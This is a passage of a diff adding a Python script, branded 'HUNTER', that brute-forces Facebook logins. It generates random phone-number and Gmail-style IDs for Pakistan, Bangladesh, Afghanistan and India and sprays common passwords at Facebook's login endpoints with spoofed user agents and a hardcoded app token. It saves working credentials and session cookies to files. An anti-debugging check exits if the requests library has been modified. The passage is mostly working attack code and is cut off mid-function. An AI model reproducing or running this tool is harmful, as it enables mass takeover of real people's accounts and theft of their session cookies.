'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
+
+def clr():
+    try:
+        data = os.listdir('/sdcard')
+        if 'Android' in data:
+            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY HUNTER');exit()
+        else:exit()
+    except:exit()
+####### MODL KILLER #######
+ 
+from requests import api
+x = open(api.__file__,'r').read()
+if "print" in x:
+    clr()
+elif "sys.stdout.write" in x:
+    clr()
+else:
+    pass
+from requests import sessions
+ 
+x = open(sessions.__file__,'r').read()
+if "print" in x:
+    clr()
+elif "sys.stdout.write" in x:
+    clr()
+else:
+    pass
+from requests import models
+x = open(models.__file__,'r').read()
+if "print" in x:
+    clr()
+ 
+elif "sys.stdout.write" in x:
+    clr()
+else:
+    pass
+
+#__________NEW IDX UA_____________#
+
+def S1():
+	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
+	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
+	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
+	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
+	e = ";[FBAN/Orca-Android;FBAV/196.0.0.39;FBPN/com.facebook.orca;FBLC/fr_GN;FBBV/393718181;FBCR/Boost Mobile;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1809;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;FBRV/249421754;]"
+	ua = s + e	
+	return ua
+
+
+
+#__________BD UA_____________#
+
+ugen=[]
+for xd in range(10000):
+        aa='Mozilla/5.0 (Linux; U; Android'
+        b=random.choice(['6','7','8','9','10','11','12','13'])
+        c=f' TL-tl; {str(cellphone)}'
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+        h=random.randrange(100,114)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36'
+        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
+        ugen.append(uaku2)
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android ;'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=random.randrange(90,114)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/533.1'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt) 
+    
+
+def clear():
+	os.system('clear')
+	print(logo)
+logo=("""\033[1;37m
+\x1b[1;91mdb   db db    db d8b   db d888888b d88888b d8888b. 
+\x1b[1;91m88   88 88    88 888o  88 `~~88~~' 88'     88  `8D 
+\x1b[1;32m88ooo88 88    88 88V8o 88    88    88ooooo 88oobY' 
+\x1b[1;32m88~~~88 88    88 88 V8o88    88    88~~~~~ 88`8b   
+\x1b[1;97m88   88 88b  d88 88  V888    88    88.     88 `88. 
+\x1b[1;91mYP   YP ~Y8888P' VP   V8P    YP    Y88888P 88   YD       
+\033[1;37m═══════════════════════════════════════════════
+\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  AUTHOR    : RAFIULLAH \033[92;1m•
+\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  GITHUB    : Thi'w HUNTER
+\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  BROTHER   : ZEESHAN BALOCH
+\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  VERSION   : \033[92;1m4\033[92;1m.\033[92;1m2
+\033[1;37m═══════════════════════════════════════════════""")   
+
+def line():
+	print(f'\033[1;37m-----------------------------------------------')
+
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+ck=[]
+#_________Year checker_________#
+def asha(uid):
+    if len(uid)==15:
+        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 √'
+        elif uid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 √'
+        elif uid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 √'
+        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 √'
+        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 √'
+        elif uid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 √'
+        elif uid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'
+        elif uid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'
+        elif uid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 √'
+        elif uid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 √'
+        elif uid[:6] in ['100009']          :alif = ' ACCOUNT 2015 √'
+        elif uid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 √'
+        elif uid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 √'
+        elif uid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 √'
+        elif uid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 √'
+        elif uid[:5] in ['10005']           :alif = ' ACCOUNT 2020 √'
+        elif uid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 √'
+        elif uid[:5] in ['10008']           :alif = ' ACCOUNT 2022 √'
+        elif uid[:5] in ['10009']           :alif = ' ACCOUNT 2023 √'
+        else:alif=''
+    elif len(uid) in [9,10]:
+        alif = ' ACCOUNT 2008/2009 √'
+    elif len(uid)==8:
+        alif = ' ACCOUNT 2007/2008 √'
+    elif len(uid)==7:
+        alif = ' ACCOUNT 2006/2007 √'
+    else:alif=''
+    return alif
+
+#_________Cloning Menu_________#
+def menu():
+    try:
+                clear()        
+                x = ("***")
+                if x == ("***"):
+                        print('\033[1;31m[\033[1;32m1\033[1;31m]\033[1;37m CRACK FILE ')
+                        print('\033[1;31m[\033[1;32m2\033[1;31m]\033[1;37m RANDOM CRACK')                                    
+                        print('\033[1;31m[\033[1;32m0\033[1;31m]\033[1;37m EXIT ')
+                        line()
+                        xd=input(' CHOOSE AN OPTION: ')
+                        
+                        if xd in ['1','01']:
+                                clear()
+                                
+                                print(' PUT FILE EXAMPLE :  /sdcard/file.txt.etc..')
+                                line()
+                                file = input(' PUT FILE PATH\033[1;37m: ')
+                                try:
+                                        fo = open(file,'r').read().splitlines()
+                                except FileNotFoundError:
+                                        print(' FILE LOCATION NOT FOUND ')
+                                        time.sleep(1)
+                                        menu()
+                                clear()
+                                print('[1] METHOD ')
+                                print('[2] METHOD ')
+                                print('[3] METHOD ')
+                                print('[4] METHOD ')
+                                line()
+                                mthd=input(' CHOOSE : ')
+                                line()
+                                clear()
+                                plist = []
+                                try:
+                                        ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
+                                except:
+                                        ps_limit =1
+                                line()
+                                clear()
+                                print('\033[1;32m EXAMPLE : first last,firtslast,first123')
+                                line()
+                                for i in range(ps_limit):
+                                        plist.append(input(f' PUT PASSWORD {i+1}: '))
+                                line()
+                                clear()
+                                print(' DO YOU WENT SHOW COOKIES :? (Y/N): ')
+                                line()
+                                cx=input(' CHOOSE : ')
+                                if cx in ['y','Y','yes','Yes','1']:
+                                        pcp.append('y')
+                                else:
+                                        pcp.append('n')
+                                with tred(max_workers=30) as crack_submit:
+                                        clear()
+                                        total_ids = str(len(fo))
+                                        
+                                        print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
+                                        print(' \x1b[1;97mUSE FLIGHT MODE FOR SPEED UP')
+                                        line()
+                                        for user in fo:
+                                                ids,names = user.split('|')
+                                                passlist = plist
+                                                if mthd in ['1','01']:
+                                                        crack_submit.submit(api1,ids,names,passlist)
+                                                elif mthd in ['2','02']:
+                                                        crack_submit.submit(newidx,ids,names,passlist)
+                                                elif mthd in ['3','03']:
+                                                        crack_submit.submit(ffb,ids,names,passlist)
+                                                elif mthd in ['4','04']:
+                                                       crack_submit.submit(newidx,ids,names,passlist)        
+                                print('\033[1;37m')
+                                line()
+                                print(' THE PROCESS HAS COMPLETED')
+                                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                                line()
+                                input(' PRESS ENTER TO BACK ')
+                                os.system('python s1n.py')
+                        elif xd in ['2','02']:
+                                clear()
+                                print(' [1] PAKISTAN\n [2] BANGLADESH\n [3] AFGHANISTAN\n [4] INDIA\n [5] GMAIL\n [0] BACK MENU')
+                                line()
+                                x=input(' Choose: ')
+                                if x in ['1','01']:
+                                        pak()
+                                elif x in ['2','02']:
+                                        bd()
+                                elif x in ['3','03']:
+                                        afg()
+                                elif x in ['4','04']:
+                                        ind()        
+                                elif x in ['5','05']:  
+                                        gmail()      
+                                else:
+                                        menu()                                   
+                        elif xd in ['0','00']:
+                                exit()
+                        
+    except requests.exceptions.ConnectionError:
+                print('\n NO INTERNET CONNECTION ...')
+                exit()
+def pak():
+                user=[]
+                clear()
+                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 0300,0315,0333,0345')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as S1N:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mUSE FLIGHT MODE FOR SPEED UP \033[1;97m')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','ali123']
+                                S1N.submit(rd,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python s1n.py')
+def bd():
+                user=[]
+                clear()
+                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 017, 018, 019, 016, 9196, 9178')
+                code = input('\033[1;37m PUT CODE: ')                                              
+                try:
+                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+                        user.append(nmp)
+                with tred(max_workers=30) as S1N:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mUSE FLIGHT MODE FOR SPEED UP \033[1;97m')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,ids[:8],ids[:7],'mimmim','fatema','jannat','sadiya','Bangla','@@@###','304050','102030','203040','708090','i love you','FREE FIRE','free fire','bangladesh','bangla']
+                                S1N.submit(bd1,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python s1n.py')
+
+def afg():
+                user=[]
+                clear()
+                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 9377,9379,9374')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as S1N:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mUSE FLIGHT MODE FOR SPEED UP \033[1;97m')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+                                S1N.submit(rd,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python s1n.py')
+def ind():
+                user=[]
+                clear()
+                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 91***,etc')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as S1N:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mUSE FLIGHT MODE FOR SPEED UP \033[1;97m')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'57273200','hindustan','59039200','57575751']
+                                S1N.submit(rd,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python s1n.py')
+                
+def gmail():
+                os.system('rm -rf .re.txt')
+                clear()
+                print('\033[1;37m Example: eshal, ali, abbas, agnel\033[1;97m')
+                line()
+                first = input(' Put first name: ')
+                line()
+                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
+                line()
+                last = input(' Put last name: ')
+                line()
+                print(' Example: @gmail.com , @yahoo.com etc...')
+                line()
+                domain = input(' domain: ')
+                line()
+                try:
+                        limit=int(input(' Put limit: '))
+                except ValueError:
+                        limit = 5000
+                line()
+                print(' Getting gmails...')
+                lists = ['3','4']
+                for xd in range(limit):
+                        lchoice = random.choice(lists)
+                        if '3' in lchoice:
+                                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        else:
+                                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        fo = open('.re.txt', 'r').read().splitlines()
+                with tred(max_workers=30) as S1N:
+                        total = str(len(fo))
+                        clear()
+                   
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] TOTAL ACCOUNT: \033[1;32m'+total)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] SELECT EMAIL: \033[1;32m'+domain)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] USE FLIGHT MODE FOR SPEED UP \033[1;97m')
+                        line()
+                        for user in fo:
+                                ids,names = user.split('|')
+                                first_name = names.rsplit(' ')[0]
+                                try:
+                                        last_name = names.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',ls+'123',fs+ls+'123',ls+'12345','khankhan','57273200']
+                                S1N.submit(rd,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' Press enter to back ')
+                os.system('python s1n.py')
+
+def ffb(ids,names,passlist):
+        global loop,oks,cps
+        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mHUNTER\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        session = requests.Session()
+        try:
+                first = names.split(' ')[0]
+                try:
+                        last = names.split(' ')[1]
+                except:
+                        last = 'Khan'
+                ps = first.lower()
+                ps2 = last.lower()
+                for fikr in passlist:
+                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+                        ua=random.choice(S1())
+                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': pro, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        Aws=session.cookies.get_dict().keys()
+                        if "c_user" in Aws:
+                                coki=session.cookies.get_dict()
+                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print('\r\r\033[1;32m [HUNTER-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/HUNTER-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HUNTER-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
+                              
+                                oks.append(ids)
+                                break
+                        elif 'checkpoint' in Aws:
+                                if 'y' in pcp:
+                                        print('\r\r\x1b[38;5;208m [HUNTER-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/HUNTER-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        cps.append(ids)
+                                        break
+                                else:
+                                        break
+                        else:
+                                continue
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)
+        loop+=1
+def api1(ids,names,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mHUNTER\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
+		fn = names.split(' ')[0]
+		try:
+			ln = names.split(' ')[1]
+		except:
+			ln = fn
+		for pw in passlist:
+			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = str(po['uid'])
+				print('\r\r\033[1;32m [HUNTER-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
+				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+				cookies = f"sb={ssbb};{ckkk}"
+				print('\033[1;37m [🍪] Cookies :- '+cookies)
+				open('/sdcard/HUNTER-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+				oks.append(uid)
+				break
+			elif 'www.facebook.com' in po['error']['message']:
+				uid = str(po['error']['error_data']['uid'])
+				print(f'\r\r\033[1;33m [HUNTER-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/HUNTER-CP.txt','a').write(uid+'|'+pas+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+def rd(ids,passlist):
+	try:
+		global oks,loop
+                
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mHUNTER\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
+		for pas in passlist:                                          
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
+			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = str(po['uid'])                                  
+				print('\r\r\033[1;32m [HUNTER-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
+				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+				cookies = f"sb={ssbb};{ckkk}"
+				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
+				open('/sdcard/HUNTER-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
+				oks.append(uid)
+                                
+				break
+			elif 'www.facebook.com' in po['error']['message']:                                
+				uid = str(po['error']['error_data']['uid'])
+				print(f'\r\r\033[1;33m [HUNTER-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/HUNTER-R-CP.txt','a').write(uid+'|'+pas+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+def bd1(ids,passlist):
+    global loop
+    global cps
+    global oks   
+    try:
+        for ps in passlist:            
+            session = requests.Session()
+            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mHUNTER\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
+            pro = random.choice(S1())            
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":ids,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'web.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'light',
